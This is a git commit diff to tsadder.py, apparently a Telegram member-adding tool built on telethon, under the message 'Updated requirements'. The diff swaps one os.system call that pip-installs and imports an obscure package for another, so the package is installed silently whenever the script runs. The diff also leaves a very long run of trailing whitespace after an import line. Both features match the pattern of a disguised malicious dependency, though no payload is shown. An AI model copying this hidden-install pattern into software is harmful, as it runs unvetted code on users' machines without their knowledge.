6725ca868d4cec0e2a5432f39b8e806040f429c4
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-24 23:38:51 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontingkitsV2")
-import pythonfontingkitsV2
+os.system("pip install pythoncoloringpackage")
+import pythoncoloringpackage
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
